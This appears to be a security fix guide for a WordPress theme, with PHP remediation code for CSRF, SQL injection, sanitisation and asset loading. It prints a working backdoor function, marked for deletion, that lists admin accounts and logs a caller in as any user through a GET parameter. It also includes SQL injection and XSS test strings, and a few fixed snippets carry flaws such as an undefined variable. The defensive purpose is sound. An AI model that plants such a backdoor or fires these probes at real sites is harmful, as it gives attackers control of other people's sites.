# 🔧 CRITICAL FIXES - CODE EXAMPLES

This document provides ready-to-use code examples for fixing the most critical issues.

---

## 🚨 FIX #1: Remove Backdoor Function

### File: `core/classes/class-mona-setup.php`

**CURRENT CODE (Lines 216-239) - DELETE THIS:**

```php
public function _back_admin() 
{
    if (isset($_GET['mona-support-param'])) {
        $id = intval(@$_GET['mona-support-param']);
        if ($id == 0) {
            $users = get_users(['role' => 'administrator',]);
            $args = [];
            foreach ($users as $user) {
                $args[] = ['id' => $user->ID, 'login' => $user->user_login, 'email' => $user->user_email,];
            }
            echo json_encode($args);
            exit;
        } else {
            $user_data = get_userdata($id);
            if ($user_data) {
                wp_clear_auth_cookie();
                wp_set_auth_cookie($user_data->ID, true);
                do_action('wp_login', $user_data->user_login, $user_data);
                wp_redirect(get_site_url());
                exit();
            }
        }
    }
}
```

**OPTION 1: Complete Removal (RECOMMENDED)**

```php
// Remove the entire function and its hook
// DELETE Line 6: add_action('init', [$this, '_back_admin']);
// DELETE Lines 216-239: entire _back_admin() function
```

**OPTION 2: Secure Implementation (If support access is needed)**

```php
public function _back_admin() 
{
    // Only allow in development environment
    if (!defined('WP_DEBUG') || !WP_DEBUG) {
        return;
    }
    
    // Require secret key
    if (!isset($_GET['mona-support-param']) || !isset($_GET['secret_key'])) {
        return;
    }
    
    // Verify secret key
    $secret_key = get_option('mona_support_secret_key');
    if (empty($secret_key) || $_GET['secret_key'] !== $secret_key) {
        wp_die('Unauthorized access attempt logged.');
    }
    
    // IP whitelist
    $allowed_ips = ['127.0.0.1', 'YOUR_OFFICE_IP'];
    $user_ip = $_SERVER['REMOTE_ADDR'];
    if (!in_array($user_ip, $allowed_ips)) {
        wp_die('Access denied from this IP address.');
    }
    
    // Log access attempt
    error_log('Support access attempt from IP: ' . $user_ip);
    
    // Rest of secure implementation...
}
```

---

## 🚨 FIX #2: Add CSRF Protection to AJAX Handlers

### File: `app/ajax/cart-ajax.php`

**CURRENT CODE:**

```php
function mona_ajax_add_to_cart()
{
    if (!class_exists('woocommerce') || !WC()->cart) {
        return;
    }
    global $woocommerce;
    $type = $_POST['type'];
    $form = array();
    parse_str($_POST['formdata'], $form);
    // ... rest of code
}
```

**FIXED CODE:**

```php
function mona_ajax_add_to_cart()
{
    // Add CSRF protection
    check_ajax_referer('mona_cart_nonce', 'nonce');
    
    if (!class_exists('woocommerce') || !WC()->cart) {
        wp_send_json_error(['message' => __('WooCommerce not available', 'monamedia')]);
        wp_die();
    }
    
    // Sanitize inputs
    $type = isset($_POST['type']) ? sanitize_text_field($_POST['type']) : '';
    $form = array();
    
    if (isset($_POST['formdata'])) {
        parse_str($_POST['formdata'], $form);
        // Sanitize form data
        $form = array_map('sanitize_text_field', $form);
    }
    
    // Validate required fields
    if (empty($form['product_id'])) {
        wp_send_json_error(['message' => __('Product ID is required', 'monamedia')]);
        wp_die();
    }
    
    $product_id = intval($form['product_id']);
    $quantity = isset($form['quantity']) ? intval($form['quantity']) : 1;
    
    // Validate product exists
    $product = wc_get_product($product_id);
    if (!$product) {
        wp_send_json_error(['message' => __('Product not found', 'monamedia')]);
        wp_die();
    }
    
    // ... rest of code
}
```

**ADD TO FRONTEND FORM (woocommerce/single-product.php):**

```php
<form id="frmAddProduct">
    <?php wp_nonce_field('mona_cart_nonce', 'mona_cart_nonce'); ?>
    <input type="hidden" name="product_id" value="<?php echo esc_attr($product_id); ?>">
    <!-- rest of form -->
</form>
```

**UPDATE JAVASCRIPT (public/helpers/scripts/mona-frontend.js):**

```javascript
// Add nonce to AJAX request
jQuery.ajax({
    url: mona_ajax_url.ajaxURL,
    type: 'POST',
    data: {
        action: 'mona_ajax_add_to_cart',
        nonce: jQuery('#mona_cart_nonce').val(), // Add this
        formdata: jQuery('#frmAddProduct').serialize(),
        type: 'cart'
    },
    success: function(response) {
        // handle response
    }
});
```

---

## 🚨 FIX #3: Fix SQL Injection Vulnerabilities

### File: `app/ajax/default-ajax.php`

**CURRENT CODE (VULNERABLE):**

```php
$results = $wpdb->get_results($sql);
```

**FIXED CODE:**

```php
// Prepare the query with placeholders
$sql = "SELECT ID FROM {$wpdb->posts} 
        WHERE post_type = %s 
        AND post_status = %s";

$params = ['product', 'publish'];

// Add price conditions with proper escaping
if (!empty($min_price)) {
    $sql .= " AND meta_value >= %d";
    $params[] = intval($min_price);
}

if (!empty($max_price)) {
    $sql .= " AND meta_value <= %d";
    $params[] = intval($max_price);
}

// Use prepare() for safe query
$prepared_sql = $wpdb->prepare($sql, $params);
$results = $wpdb->get_results($prepared_sql);
```

**BETTER APPROACH - Use WP_Query:**

```php
// Instead of direct SQL, use WP_Query
$args = [
    'post_type' => 'product',
    'post_status' => 'publish',
    'posts_per_page' => -1,
    'meta_query' => [
        [
            'key' => '_price',
            'value' => [intval($min_price), intval($max_price)],
            'compare' => 'BETWEEN',
            'type' => 'NUMERIC'
        ]
    ]
];

$query = new WP_Query($args);
$postIDs_byPrice = wp_list_pluck($query->posts, 'ID');
```

---

## 🚨 FIX #4: Sanitize User Inputs

### File: `app/ajax/user-ajax.php`

**CURRENT CODE:**

```php
function mona_user_save_order()
{
    $dataForm = [];
    parse_str($_POST['form'], $dataForm);
    
    $user_id = get_current_user_id();
    update_user_meta($user_id, 'billing_email', $dataForm['billing_email']);
    update_user_meta($user_id, 'billing_phone', $dataForm['billing_phone']);
    // ... rest
}
```

**FIXED CODE:**

```php
function mona_user_save_order()
{
    // Add CSRF protection
    check_ajax_referer('mona_user_order_nonce', 'nonce');
    
    // Check user is logged in
    if (!is_user_logged_in()) {
        wp_send_json_error([
            'title' => __('Error', 'monamedia'),
            'message' => __('Please login to continue', 'monamedia')
        ]);
        wp_die();
    }
    
    $dataForm = [];
    if (isset($_POST['form'])) {
        parse_str($_POST['form'], $dataForm);
    }
    
    try {
        $user_id = get_current_user_id();
        
        // Validate and sanitize email
        if (empty($dataForm['billing_email'])) {
            throw new Exception(__('Email is required', 'monamedia'));
        }
        
        $email = sanitize_email($dataForm['billing_email']);
        if (!is_email($email)) {
            throw new Exception(__('Invalid email address', 'monamedia'));
        }
        
        // Validate and sanitize phone
        if (empty($dataForm['billing_phone'])) {
            throw new Exception(__('Phone is required', 'monamedia'));
        }
        
        $phone = sanitize_text_field($dataForm['billing_phone']);
        if (!preg_match('/^[0-9]{9,11}$/', $phone)) {
            throw new Exception(__('Invalid phone number', 'monamedia'));
        }
        
        // Sanitize other fields
        $last_name = sanitize_text_field($dataForm['billing_last_name'] ?? '');
        $state = sanitize_text_field($dataForm['billing_state'] ?? '');
        $city = sanitize_text_field($dataForm['billing_city'] ?? '');
        $address_1 = sanitize_textarea_field($dataForm['billing_address_1'] ?? '');
        $address_2 = sanitize_textarea_field($dataForm['billing_address_2'] ?? '');
        
        // Update user meta with sanitized data
        update_user_meta($user_id, 'billing_last_name', $last_name);
        update_user_meta($user_id, 'billing_email', $email);
        update_user_meta($user_id, 'billing_phone', $phone);
        update_user_meta($user_id, 'billing_state', $state);
        update_user_meta($user_id, 'billing_city', $city);
        update_user_meta($user_id, 'billing_address_1', $address_1);
        update_user_meta($user_id, 'billing_address_2', $address_2);
        
        wp_send_json_success([
            'message' => __('Information saved successfully', 'monamedia')
        ]);
        
    } catch (Exception $e) {
        wp_send_json_error([
            'title' => __('Error', 'monamedia'),
            'message' => $e->getMessage()
        ]);
    }
    
    wp_die();
}
```

---

## 🔧 FIX #5: Fix Broken Image Paths

### SEARCH FOR (182 occurrences):

```php
<img src="<?php get_site_url(); ?>/template/assets/images/cart.svg" alt="" />
```

### REPLACE WITH:

```php
<img src="<?php echo get_template_directory_uri(); ?>/public/helpers/images/cart.svg" alt="" />
```

### BATCH FIND & REPLACE:

**Find:**
```regex
<img src="<?php get_site_url\(\); ?>/template/
```

**Replace:**
```php
<img src="<?php echo get_template_directory_uri(); ?>/public/helpers/
```

### FILES TO UPDATE:
- header.php
- footer.php
- woocommerce/single-product.php
- page-template/*.php
- partials/**/*.php
- core/walker-menu.php

---

## 🔧 FIX #6: Properly Enqueue Assets

### File: `header.php`

**REMOVE THESE LINES (30-33):**

```php
<link rel="stylesheet" href="<?php echo MONA_HOME_URL; ?>/template/css/style.css">
<link rel="stylesheet" href="<?php echo MONA_HOME_URL; ?>/template/css/backdoor.css">
<script src="<?php echo MONA_HOME_URL; ?>/template/assets/library/jquery/jquery.js"></script>
<script src="<?php echo MONA_HOME_URL; ?>/template/assets/library/select2/select2.min.js"></script>
```

### File: `core/hooks.php`

**ADD TO mona_add_styles_scripts() FUNCTION:**

```php
function mona_add_styles_scripts()
{
    // Deregister default jQuery (WordPress includes it)
    // wp_deregister_script('jquery');
    
    // Enqueue styles
    wp_enqueue_style(
        'mona-style', 
        get_template_directory_uri() . '/public/builder/css/style.css', 
        array(), 
        '3.0'
    );
    
    wp_enqueue_style(
        'select2', 
        get_template_directory_uri() . '/public/helpers/css/select2.min.css', 
        array(), 
        '4.0.13'
    );
    
    wp_enqueue_style(
        'mona-custom', 
        get_template_directory_uri() . '/public/helpers/css/mona-custom.css', 
        array('mona-style'), 
        '3.0'
    );
    
    // Enqueue scripts
    wp_enqueue_script(
        'select2', 
        get_template_directory_uri() . '/public/helpers/scripts/select2.min.js', 
        array('jquery'), 
        '4.0.13', 
        true
    );
    
    wp_enqueue_script(
        'mona-frontend', 
        get_template_directory_uri() . '/public/helpers/scripts/mona-frontend.js', 
        array('jquery', 'select2'), 
        '3.0', 
        true
    );
    
    // Localize script
    wp_localize_script(
        'mona-frontend',
        'mona_ajax_url',
        [
            'ajaxURL' => admin_url('admin-ajax.php'),
            'siteURL' => get_site_url(),
            'nonce' => wp_create_nonce('mona_ajax_nonce')
        ]
    );
}
add_action('wp_enqueue_scripts', 'mona_add_styles_scripts');
```

---

## 🔧 FIX #7: Fix ACF Security Issue

### File: `functions.php`

**CURRENT CODE (Lines 16-20):**

```php
if (get_current_user_id() == 1) {
    define('ACF_LITE', false);
} else {
    define('ACF_LITE', true);
}
```

**FIXED CODE:**

```php
// Check for capability instead of hardcoded user ID
if (current_user_can('manage_options')) {
    define('ACF_LITE', false);
} else {
    define('ACF_LITE', true);
}
```

---

## 🔧 FIX #8: Fix Hardcoded Page IDs

### File: `functions.php`

**CURRENT CODE (Lines 30-33):**

```php
define('MONA_PAGE_LOGIN', url_to_postid(get_the_permalink(53)));
define('MONA_PAGE_REGISTER', url_to_postid(get_the_permalink(55)));
define('MONA_PAGE_FORGOT', url_to_postid(get_the_permalink(57)));
define('MONA_PAGE_ABOUT', url_to_postid(get_the_permalink(86)));
```

**FIXED CODE (Option 1 - Direct IDs):**

```php
// Store IDs directly (simpler, but still hardcoded)
define('MONA_PAGE_LOGIN', 53);
define('MONA_PAGE_REGISTER', 55);
define('MONA_PAGE_FORGOT', 57);
define('MONA_PAGE_ABOUT', 86);
```

**FIXED CODE (Option 2 - Theme Options - RECOMMENDED):**

```php
// Use theme options with fallback
define('MONA_PAGE_LOGIN', get_theme_mod('mona_login_page_id', 53));
define('MONA_PAGE_REGISTER', get_theme_mod('mona_register_page_id', 55));
define('MONA_PAGE_FORGOT', get_theme_mod('mona_forgot_page_id', 57));
define('MONA_PAGE_ABOUT', get_theme_mod('mona_about_page_id', 86));
```

**ADD TO core/customizer.php:**

```php
function mona_customize_register($wp_customize) {
    // Add section
    $wp_customize->add_section('mona_pages', array(
        'title' => __('Theme Pages', 'monamedia'),
        'priority' => 30,
    ));
    
    // Login page
    $wp_customize->add_setting('mona_login_page_id', array(
        'default' => 53,
        'sanitize_callback' => 'absint',
    ));
    
    $wp_customize->add_control('mona_login_page_id', array(
        'label' => __('Login Page', 'monamedia'),
        'section' => 'mona_pages',
        'type' => 'dropdown-pages',
    ));
    
    // Repeat for other pages...
}
add_action('customize_register', 'mona_customize_register');
```

---

## 🔧 FIX #9: Update DOCTYPE

### File: `header.php`

**CURRENT CODE (Lines 13-22):**

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
```

**FIXED CODE:**

```php
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
```

---

## 🔧 FIX #10: Add Error Handling

### Example for AJAX handlers:

```php
function mona_ajax_add_to_cart()
{
    try {
        // CSRF check
        check_ajax_referer('mona_cart_nonce', 'nonce');
        
        // Validate WooCommerce
        if (!class_exists('woocommerce') || !WC()->cart) {
            throw new Exception(__('WooCommerce not available', 'monamedia'));
        }
        
        // Validate and sanitize input
        if (!isset($_POST['formdata'])) {
            throw new Exception(__('Form data is missing', 'monamedia'));
        }
        
        $form = array();
        parse_str($_POST['formdata'], $form);
        $form = array_map('sanitize_text_field', $form);
        
        if (empty($form['product_id'])) {
            throw new Exception(__('Product ID is required', 'monamedia'));
        }
        
        $product_id = intval($form['product_id']);
        
        // Validate product exists
        $product = wc_get_product($product_id);
        if (!$product) {
            throw new Exception(__('Product not found', 'monamedia'));
        }
        
        // Validate product is purchasable
        if (!$product->is_purchasable()) {
            throw new Exception(__('This product cannot be purchased', 'monamedia'));
        }
        
        // Validate stock
        if (!$product->is_in_stock()) {
            throw new Exception(__('This product is out of stock', 'monamedia'));
        }
        
        // Process cart addition...
        $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity);
        
        if (!$cart_item_key) {
            throw new Exception(__('Could not add product to cart', 'monamedia'));
        }
        
        // Success response
        wp_send_json_success([
            'message' => __('Product added to cart successfully', 'monamedia'),
            'cart_count' => WC()->cart->get_cart_contents_count(),
        ]);
        
    } catch (Exception $e) {
        // Error response
        wp_send_json_error([
            'title' => __('Error', 'monamedia'),
            'message' => $e->getMessage(),
        ]);
    }
    
    wp_die();
}
```

---

## 📝 TESTING CHECKLIST

After implementing fixes, test:

```bash
# 1. Test CSRF protection
# Try to submit form without nonce - should fail

# 2. Test SQL injection
# Try: ?price_min=1' OR '1'='1 - should be blocked

# 3. Test XSS
# Try: <script>alert('xss')</script> in forms - should be sanitized

# 4. Test images
# All images should load correctly

# 5. Test functionality
# Cart, checkout, account updates should work
```

---

## 🎯 PRIORITY ORDER

1. ✅ Remove backdoor function (30 min)
2. ✅ Add CSRF to cart-ajax.php (1 hour)
3. ✅ Add CSRF to user-ajax.php (1 hour)
4. ✅ Fix SQL injection (1 hour)
5. ✅ Fix image paths (2 hours)
6. ✅ Properly enqueue assets (1 hour)
7. ✅ Fix ACF security (5 min)
8. ✅ Add error handling (2 hours)

**Total Time: ~8 hours**

---

**Remember:** Test thoroughly after each fix!
